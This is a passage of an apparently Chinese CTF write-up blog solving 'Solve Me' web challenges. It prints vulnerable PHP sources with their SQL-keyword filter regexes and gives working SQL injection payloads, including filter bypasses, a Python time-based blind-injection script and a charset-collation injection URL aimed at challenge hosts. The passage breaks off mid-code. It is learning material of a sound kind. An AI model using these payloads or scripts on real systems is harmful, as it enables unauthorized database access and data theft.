class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// It's 'Anti SQLi' problem of 'Solve Me'.</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>; </span><br><span class="line"></span><br><span class="line">    $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">    $pw = $_GET[<span class="string">'pw'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($id, $pw))&#123;</span><br><span class="line">        preg_match(</span><br><span class="line">            <span class="string">'/\.|\`|"|\'|\\|\xA0|\x0B|0x0C|\t|\r|\n|\0|'</span>.</span><br><span class="line">            <span class="string">'=|&lt;|&gt;|\(|\)|@@|\|\||&amp;&amp;|#|\/\*.*\*\/|--[\s\xA0]|'</span>.</span><br><span class="line">            <span class="string">'0x[0-9a-f]+|0b[01]+|x\'[0-9a-f]+\'|b\'[01]+\'|'</span>.</span><br><span class="line">            <span class="string">'[\s\xA0\'"]+(as|or|and|r*like|regexp)[\s\xA0\'"]+|'</span>.</span><br><span class="line">            <span class="string">'union[\s\xA0]+select|[\s\xA0](where|having)|'</span>.</span><br><span class="line">            <span class="string">'[\s\xA0](group|order)[\s\xA0]+by|limit[\s\xA0]+\d|'</span>.</span><br><span class="line">            <span class="string">'information_schema|procedure\s+analyse\s*/is'</span>,</span><br><span class="line">            $id.<span class="string">','</span>.$pw</span><br><span class="line">        ) <span class="keyword">and</span> <span class="keyword">die</span>(<span class="string">'Hack detected'</span>);</span><br><span class="line"></span><br><span class="line">        $con = mysqli_connect($sql_host, $sql_username, $sql_password, $sql_dbname)</span><br><span class="line">            <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'SQL server down'</span>);</span><br><span class="line"></span><br><span class="line">        $result = mysqli_fetch_array(</span><br><span class="line">            mysqli_query(</span><br><span class="line">                $con, </span><br><span class="line">                <span class="string">"SELECT * FROM `antisqli` WHERE `id`='&#123;$id&#125;' AND `pw`=md5('&#123;$pw&#125;');"</span></span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">        mysqli_close($con);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($result))&#123;</span><br><span class="line">            <span class="keyword">if</span>($result[<span class="string">'no'</span>] === <span class="string">'31337'</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> $flag;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'Hello, '</span>, $result[<span class="string">'id'</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Login failed'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>简单说一下这段代码的意思，就是传进两个参数，然后进行过滤，然后进行数据库的查找，查找的结果里面如果含有<code>31337</code>的就可以成功输出flag了</p><p>这段代码里面有一个很吓唬人的过滤准则，但是其实里面存在小漏洞<br>    首先过滤了单引号啥的，注入一个单引号行不通，但是我们可以去掉一个单引号，如果要正则匹配\的话，正确的写法应该是 <code>|\\\\|</code>也就是说，反斜杠没有被过滤。这样我们可以注入反斜杠把id的第二个单引号给搞掉。这样一来就可以注入了<br>第二点就是他那个<code>union[\s\xA0]+select</code>把所有非空字符都过滤掉了，所以说直接上<code>union select</code>是不太行的,但是我们可以用<code>union all select</code>去绕过<br>然后是注释的问题，因为正则里面明确把<code>#</code>，还有<code>--加上空字符</code>过滤掉了，那我们用<code>--%1a</code>注释也是可以的<br>还有因为这里<code>order by</code> 也过滤了，只能手动去测试列数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=\&amp;pw=union all select 1 from antisqli --%1A</span><br></pre></td></tr></table></figure><p>发现回显的是Login failed说明列数不对，再继续试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=\&amp;pw=union all select 1,2 from antisqli --%1A</span><br></pre></td></tr></table></figure><p>还是login failed,再继续试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=\&amp;pw=union all select 1,2,3 from antisqli --%1A</span><br></pre></td></tr></table></figure><p>这时候回显Hello了，代码逻辑跳到第一个if条件里面，说明有3列<br>然后我们直接上payload<br><code>?id=\&amp;pw=union all select 31337,2,3 from antisqli --%1A</code> 直接出flag<br>这里的语句在数据库里大概是这样的</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="string">`antisqli`</span> <span class="keyword">WHERE</span> <span class="string">`id`</span>=<span class="string">' \' and `pw` = md5('</span> <span class="keyword">union</span> all <span class="keyword">select</span> .... <span class="keyword">from</span> ... <span class="comment">--%1a</span></span><br></pre></td></tr></table></figure><p>重点是union all前面的语句为空，直接执行后面的语句，这太灵活了，又学到了</p><h3 id="Name-check"><a href="#Name-check" class="headerlink" title="Name check"></a>Name check</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   error_reporting(<span class="number">0</span>);</span><br><span class="line">   <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>; </span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">       $name = $_GET[<span class="string">'name'</span>];</span><br><span class="line">       <span class="keyword">if</span>(preg_match(<span class="string">"/admin|--|;|\(\)|\/\*|\\0/i"</span>, $name))&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">'Not allowed input'</span>;</span><br><span class="line">           <span class="keyword">goto</span> quit;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $sql = <span class="keyword">new</span> SQLite3(<span class="string">'name_check.db'</span>, SQLITE3_OPEN_READWRITE);</span><br><span class="line">       $res = $sql-&gt;query(<span class="string">"</span></span><br><span class="line"><span class="string">           SELECT </span></span><br><span class="line"><span class="string">           MAX('0','1','&#123;$name&#125;') LIKE 'a%', </span></span><br><span class="line"><span class="string">           INSTR('&#123;$name&#125;','d')&gt;0, </span></span><br><span class="line"><span class="string">           MIN('&#123;$name&#125;','b','c') LIKE '__m__', </span></span><br><span class="line"><span class="string">           SUBSTR('&#123;$name&#125;',-2)='in'</span></span><br><span class="line"><span class="string">       ;"</span>);</span><br><span class="line">       <span class="keyword">if</span>($res === <span class="keyword">false</span>)&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">'Database error'</span>;</span><br><span class="line">           <span class="keyword">goto</span> quit;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $row = $res-&gt;fetchArray(SQLITE3_NUM);</span><br><span class="line">       <span class="keyword">if</span>(</span><br><span class="line">           $row[<span class="number">0</span>] + $row[<span class="number">1</span>] + $row[<span class="number">2</span>] + $row[<span class="number">3</span>] !== <span class="number">4</span> ||</span><br><span class="line">           array_sum($row) !== <span class="number">4</span> </span><br><span class="line">       )&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">'Auth failed'</span>;</span><br><span class="line">           <span class="keyword">goto</span> quit;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">echo</span> $flag;</span><br><span class="line"></span><br><span class="line">   quit:</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>我没玩过sqlite，但是感觉这里一定要满足admin这个东西，因为query函数后面的东西，但是这里的过滤是正整一个词的过滤，但是我们可以用sqlite的连接词<code>||</code>去实现绕过，但是对于mysql字符串的拼接只能用<code>concat</code>函数去拼接<br>所以最后的payload：<code>ad&#39;||&#39;min</code></p><h3 id="I-am-slowly"><a href="#I-am-slowly" class="headerlink" title="I am slowly"></a>I am slowly</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// It's 'I am slowly' problem of 'Solve Me'.</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>; </span><br><span class="line"></span><br><span class="line">    $table = <span class="string">'iamslowly_'</span>.ip2long($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    $answer = $_GET[<span class="string">'answer'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($answer))&#123;</span><br><span class="line">        $con = mysqli_connect($sql_host, $sql_username, $sql_password, $sql_dbname)</span><br><span class="line">            <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'SQL server down'</span>);</span><br><span class="line"></span><br><span class="line">        $result = mysqli_fetch_array(</span><br><span class="line">            mysqli_query($con, <span class="string">"SELECT `count` FROM `&#123;$table&#125;`;"</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($result))&#123;</span><br><span class="line">            mysqli_query($con, <span class="string">"CREATE TABLE IF NOT EXISTS `&#123;$table&#125;` (`answer` char(32) NOT NULL, `count` int(4) NOT NULL);"</span>);</span><br><span class="line">            $new_answer = md5(sha1(<span class="string">'iamslowly_'</span>.mt_rand().<span class="string">'_'</span>.mt_rand().<span class="string">'_'</span>.mt_rand()));</span><br><span class="line">            mysqli_query($con, <span class="string">"INSERT INTO `&#123;$table&#125;` (`answer`,`count`) VALUES ('&#123;$new_answer&#125;',1);"</span>);</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">elseif</span>($result[<span class="string">'count'</span>] === <span class="string">'12'</span>)&#123;</span><br><span class="line">            mysqli_query($con, <span class="string">"DROP TABLE `&#123;$table&#125;`;"</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Game over'</span>;</span><br><span class="line">            <span class="keyword">goto</span> quit;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $randtime = mt_rand(<span class="number">1</span>, <span class="number">10</span>);</span><br><span class="line">        $result = mysqli_fetch_array(</span><br><span class="line">            mysqli_query($con, <span class="string">"SELECT * FROM `&#123;$table&#125;` WHERE sleep(&#123;$randtime&#125;) OR `answer`='&#123;$answer&#125;';"</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($result) &amp;&amp; $result[<span class="string">'answer'</span>] === $answer)&#123;</span><br><span class="line">            mysqli_query($con, <span class="string">"DROP TABLE `&#123;$table&#125;`;"</span>);</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            mysqli_query($con, <span class="string">"UPDATE `&#123;$table&#125;` SET `count`=`count`+1;"</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Go fast'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">quit:</span><br><span class="line">        mysqli_close($con);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这个题目也是很骚，我第一次遇见这一种类型的题目，利用来了php以及mysql之间的延时关系去绕过那一个可恶的12.。。<br>但是执行过程过于缓慢啊，主要是两个延时太过耗时<br>概述一下这题目的意思传参进去之后，如果没有对应的表就根据你的ip创建一个表，并且这个表里面含有一个名为COUNT的字段，初始值为1，后面就一直往这里面的COUNT+1，如果到12的话就会把表删掉重新再新建一个表，所以关键是他的逻辑顺序出了错误。</p><p><code>判断count的值–&gt;执行SQL语句–&gt;加count值</code></p><p>这个逻辑在执行语句的时候有问题，当count=11的时候，我们执行一个sleep()时间很长的语句，该请求就会长时间停在 执行SQL语句 流程中，如果此时我们再发起一次正常请求，判断count值还是11，执行完SQL语句之后count+1=12，再当上一条SQL语句执行完毕后count再加1等于13，于是之后就可以无限制提交请求了，然后在利用盲注来获得answer，这确实骚气<br>小脚本，最好还是把header啥的都弄进去，毕竟是靠ip建表的，这个东西跑得很慢不值得，而且一直都跑的错的答案，QAQ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">keys = <span class="string">'0123456789abcdef'</span></span><br><span class="line">header = &#123;</span><br><span class="line"><span class="string">"Host"</span>: <span class="string">"iamslowly.thinkout.rf.gd"</span>,</span><br><span class="line">    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0"</span>,</span><br><span class="line">     <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span>,</span><br><span class="line">     <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span>,</span><br><span class="line">      <span class="string">"Accept-Encoding"</span>:<span class="string">"gzip, deflate"</span>,</span><br><span class="line">      <span class="string">"Referer"</span>: <span class="string">"http://iamslowly.thinkout.rf.gd/"</span>,</span><br><span class="line"><span class="string">"Cookie"</span>: <span class="string">"__test=4e8126e93f7b5a4448c7e3c1f0b7853e"</span>,</span><br><span class="line">    <span class="string">"Upgrade-Insecure-Requests"</span>:<span class="string">"1"</span>,</span><br><span class="line">      <span class="string">"Cache-Control"</span>: <span class="string">"max-age=0"</span></span><br><span class="line">&#125;</span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> keys:</span><br><span class="line">        url = <span class="string">"http://iamslowly.thinkout.rf.gd/?i=1&amp;answer=' or if((answer like '&#123;&#125;%'),sleep(30),2)%23"</span>.format(payload + j)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            content = requests.get(url,headers=header,timeout=<span class="number">29</span>).content</span><br><span class="line">            <span class="comment">#print(content[:10])</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">'[+]Waiting!'</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            payload += j</span><br><span class="line">            print(payload)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="Cheap-Lottery"><a href="#Cheap-Lottery" class="headerlink" title="Cheap Lottery"></a>Cheap Lottery</h3><p>这个题目一开始用扫描器扫一下发现里面存在robots.txt打开发现</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /backup/</span><br></pre></td></tr></table></figure><p>进去backup发现几个文件</p><p>一个数据库文件，还有一份源码</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`lottery`</span> (</span><br><span class="line">  <span class="string">`name`</span> <span class="built_in">char</span>(<span class="number">30</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`time`</span> <span class="built_in">int</span>(<span class="number">4</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`nums`</span> <span class="built_in">char</span>(<span class="number">30</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span></span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> <span class="string">`lottery`</span></span><br><span class="line">  <span class="keyword">ADD</span> <span class="keyword">UNIQUE</span> <span class="keyword">KEY</span> <span class="string">`name`</span> (<span class="string">`name`</span>);</span><br></pre></td></tr></table></figure><p>作为菜鸟感觉是SQL注入，但无从下手，知道发现原来方方土学长早就写过这题的题解<a href="https://www.anquanke.com/post/id/101939" target="_blank" rel="noopener">https://www.anquanke.com/post/id/101939</a><br>这波骚操作还是6，运用了字符集去绕过</p><p>而且p神也发过类似的文章(tql,QAQ)<br><a href="https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html</a></p><p>先讲一下这一段代码的意思，发现骆骆大佬早就做过这题而且流程图都画好了，我就直接贴图吧。。简单粗暴<br><img src="https://s1.ax1x.com/2018/04/03/CpBkLt.png" alt="这里写图片描述"></p><p>我们要利用的点就是这一段代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$nums = preg_replace(<span class="string">"/[a-zA-Z\[\]\=]/"</span>, <span class="string">""</span>, $url_query);</span><br><span class="line">$nums = strtr($nums, <span class="string">"&amp;"</span>, <span class="string">","</span>);</span><br><span class="line">$sql-&gt;query(<span class="string">"INSERT INTO `lottery`(`name`, `time`, `nums`) VALUE('&#123;$name&#125;', '&#123;$time&#125;', '&#123;$nums&#125;');"</span>);</span><br></pre></td></tr></table></figure><p>这段代码往数据库里面添加数据，只要我们往里面添加自己规定的值，然后再在另一处以同一ip地址进行访问(不购买)不就可以直接进到check模块了。。<br>意思就是这样<br>开始数据库里面是这样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO `lotter` (`name`,`time`,`nums`) VALUES (<span class="string">'guest_1.1.1.1'</span>,<span class="string">'time()'</span>,<span class="string">'69,69,69,69,69'</span>);</span><br></pre></td></tr></table></figure><p>后来我们构造，使数据库一开始就存在这样的值，我们下一次访问的时候就名正言顺的是买正确了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO `lotter` (`name`,`time`,`nums`) VALUES (<span class="string">'guest_1.1.1.1'</span>,<span class="string">'time()'</span>,<span class="string">'69'</span>),(<span class="string">'admin1.1.1.1'</span>,<span class="string">'$time'</span>,<span class="string">'69,69,69,69,69'</span>),(<span class="string">'guest_1.1.1.1'</span>,<span class="string">'$time'</span>,<span class="string">'69,69,69,69,69'</span>)<span class="comment">#',69,69,69,69');</span></span><br></pre></td></tr></table></figure><p>就可以名正言顺地使<code>bingo</code>这个值等于5，然后就输出flag了，也就是进入下面这段代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$bingo = <span class="number">0</span>;</span><br><span class="line">$nums_admin = explode(<span class="string">","</span>, $row_admin[<span class="string">'nums'</span>]); <span class="comment">// admin_*</span></span><br><span class="line">$nums_guest = explode(<span class="string">","</span>, $row_guest[<span class="string">'nums'</span>]); <span class="comment">// guest_*</span></span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">5</span>; ++$i)&#123;</span><br><span class="line"><span class="keyword">for</span>($k = <span class="number">0</span>; $k &lt; <span class="number">5</span>; ++$k)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($nums_admin[$i], $nums_guest[$k]) &amp;&amp; $nums_admin[$i] === $nums_guest[$k])&#123;</span><br><span class="line">++$bingo;</span><br><span class="line"><span class="keyword">unset</span>($nums_guest[$k]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unset</span>($nums_admin, $nums_guest);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($bingo == <span class="number">5</span>)&#123; <span class="comment">// correct all</span></span><br><span class="line">$msg = <span class="string">"Perfect! The flag is &lt;code&gt;&#123;$flag&#125;&lt;/code&gt;."</span>;</span><br></pre></td></tr></table></figure><p>但是我们要网关键的代码注入自己想要的东西，就必须得绕过字母这个步骤，这里开始及牵涉到字符集的问题了。</p><p>总结一下那几篇博客看到的点<br>MySQL中的字符集转换过程：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. MySQL Server收到请求时将请求数据从character_set_client转换为character_set_connection；</span><br><span class="line">2. 进行内部操作前将请求数据从character_set_connection转换为内部操作字符集，其确定方法如下：</span><br><span class="line">使用每个数据字段的CHARACTER SET设定值；</span><br><span class="line">• 若上述值不存在，则使用对应数据表的DEFAULT CHARACTER SET设定值(MySQL扩展，非SQL标准)；</span><br><span class="line">• 若上述值不存在，则使用对应数据库的DEFAULT CHARACTER SET设定值；</span><br><span class="line">• 若上述值不存在，则使用character_set_server设定值。</span><br><span class="line">3. 将操作结果从内部操作字符集转换为character_set_results</span><br></pre></td></tr></table></figure></p><p>也就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">character_set_client -&gt; character_set_connection -&gt; 内部操作字符集</span><br></pre></td></tr></table></figure><p>而且p神说的在MySQL里面的utf-8是阉割版，最长只支持三个字节，<br>如果你需要Mysql支持四字节的utf-8，可以使用utf8mb4编码。<br>但是这个点跟这题无关，这个点用在让数据库误认为该字母不存在直接舍弃掉的情况</p><p>第二个点是<br>mysql 有两个支持 unicode 的 character set:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ucs2: 使用 16 bits 来表示一个 unicode 字符。</span><br><span class="line">utf8: 使用 1~3 bytes 来表示一个 unicode 字符。</span><br></pre></td></tr></table></figure><p>而在本题目中，sql文件中显示</p><p><code>ENGINE=InnoDB DEFAULT CHARSET=utf8;</code></p><p>很显然这里是utf8，而我们一般数据库默认使用的是utf8_general_ci，而ci是指case insensitive的缩写，即大小写不敏感</p><p>这样也表明了为什么平常我们在cmd命令行下写数据库命令不区分大小写了</p><p>根据方方土学长所说的，这种模式由于diacritic ordering的排序问题使得读音符号最后被认定为英文字母</p><p>也就是对于utf8_general_ci，认为以下样例是相等的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Ä = A</span><br><span class="line">Ö = O</span><br><span class="line">Ü = U</span><br></pre></td></tr></table></figure><p>而且还给出了这个超级腻害的表<br><a href="http://collation-charts.org/mysql60/mysql604.utf8_general_ci.european.html" target="_blank" rel="noopener">http://collation-charts.org/mysql60/mysql604.utf8_general_ci.european.html</a><br>表格上方是 unicode 编码，下方是 utf8 编码</p><p>然后构造一下admin还有guest</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin: %C3%A4%C4%8F%E1%B8%BF%C3%AF%C3%B1</span><br><span class="line">guest: %C4%9D%C3%B9%C3%A8%C5%9B%C5%A3</span><br></pre></td></tr></table></figure><p>Payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$vps_ip = <span class="string">'你的vps地址'</span>;</span><br><span class="line">$time = time();</span><br><span class="line">    $url = <span class="string">"http://cheaplottery.solveme.peng.kr/index.php?lottery%5BA%5D=1'),('%C3%A4%C4%8F%E1%B8%BF%C3%AF%C3%B1_"</span>.$vps_ip.<span class="string">"','&#123;$time&#125;','1,1,1,1,1'),('%C4%9D%C3%B9%C3%A8%C5%9B%C5%A3_"</span>.$vps_ip.<span class="string">"','&#123;$time&#125;','1,1,1,1,1')%23&amp;lottery%5BB%5D=&amp;lottery%5BC%5D=&amp;lottery%5BD%5D=&amp;lottery%5BE%5D="</span>;</span><br><span class="line">    <span class="keyword">echo</span> $url;</span><br></pre></td></tr></table></figure><p>然后在你的vps上再curl一下就得到flag了</p><p><a href="https://imgchr.com/i/P2t4AI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/14/P2t4AI.md.png" alt="P2t4AI.md.png"></a></p><h3 id="Check-via-eval"><a href="#Check-via-eval" class="headerlink" title="Check via eval"></a>Check via eval</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    $exam = <span class="string">'return\''</span>.sha1(time()).<span class="string">'\';'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;a href="./?flag='</span>.$exam.<span class="string">'"&gt;Click 